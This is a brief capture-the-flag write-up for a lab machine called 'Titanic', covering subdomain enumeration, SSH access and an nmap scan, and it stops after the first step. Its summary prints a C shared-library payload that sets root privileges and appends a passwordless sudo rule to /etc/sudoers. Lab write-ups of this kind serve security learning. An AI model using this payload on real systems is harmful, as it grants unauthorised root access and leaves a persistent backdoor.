# 🚢Titanic

## 🧠Summary 
> Using basics of web enumeration to find the vulnerabale subdomain which leads access to the
> machine using SSH(secure shell). In the machine found a vulnerable file identify_image.sh, So introduced a
> C program for gaining root access
  ```C
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```
## 🔍Step 1 (Nmap scan)
- Did an nmap scan to determine the open ports in the machine
  ```bash
  nmap -sV -v {ip address}
  ```
- Note: Using the sV flag is for version detection which is always useful because can search in the web for past vulnareblity of that version
- The result of the nmap scan is in this link 👉 [nmap_scan_result](./nmap_scan.txt)
- 
